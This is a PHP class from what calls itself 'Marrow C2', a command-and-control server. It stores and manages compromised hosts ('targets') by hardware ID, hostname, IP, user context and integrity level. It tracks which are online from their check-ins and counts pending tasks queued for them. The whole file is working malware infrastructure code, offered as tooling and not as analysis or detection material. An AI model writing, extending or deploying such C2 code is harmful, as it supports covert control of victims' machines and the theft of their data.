<?php
// Marrow C2 - Target Management Class
require_once __DIR__ . '/Database.php';

class Target
{
    private $db;

    public function __construct()
    {
        $this->db = Database::getInstance();
    }

    public function getAll()
    {
        return $this->db->fetchAll("
            SELECT *, 
                   TIMESTAMPDIFF(SECOND, last_seen, NOW()) as seconds_ago,
                   CASE WHEN TIMESTAMPDIFF(SECOND, last_seen, NOW()) < 10 THEN 1 ELSE 0 END as is_online
            FROM targets 
            ORDER BY last_seen DESC
        ");
    }

    public function get($hwid)
    {
        return $this->db->fetch("
            SELECT *, 
                   TIMESTAMPDIFF(SECOND, last_seen, NOW()) as seconds_ago,
                   CASE WHEN TIMESTAMPDIFF(SECOND, last_seen, NOW()) < 10 THEN 1 ELSE 0 END as is_online
            FROM targets 
            WHERE hwid = ?
        ", [$hwid]);
    }

    public function getStats()
    {
        $total = $this->db->fetch("SELECT COUNT(*) as c FROM targets")['c'];
        $online = $this->db->fetch("SELECT COUNT(*) as c FROM targets WHERE last_seen > NOW() - INTERVAL 10 SECOND")['c'];
        $pending = $this->db->fetch("SELECT COUNT(*) as c FROM tasks WHERE status = 'pending'")['c'];

        return [
            'total' => $total,
            'online' => $online,
            'offline' => $total - $online,
            'pending' => $pending
        ];
    }

    public function delete($hwid)
    {
        $this->db->execute("DELETE FROM targets WHERE hwid = ?", [$hwid]);
        $this->db->execute("DELETE FROM tasks WHERE target_hwid = ?", [$hwid]);
        return true;
    }

    public function checkin($hwid, $hostname, $ip, $user, $integrity, $os = null)
    {
        $sql = "INSERT INTO targets (hwid, hostname, ip_address, user_context, integrity_level, os_info, last_seen) 
                VALUES (?, ?, ?, ?, ?, ?, NOW()) 
                ON DUPLICATE KEY UPDATE 
                    last_seen = NOW(),
                    hostname = COALESCE(?, hostname),
                    ip_address = COALESCE(?, ip_address),
                    user_context = COALESCE(?, user_context),
                    integrity_level = COALESCE(?, integrity_level),
                    os_info = COALESCE(?, os_info)";

        $this->db->execute($sql, [$hwid, $hostname, $ip, $user, $integrity, $os, $hostname, $ip, $user, $integrity, $os]);
    }
}
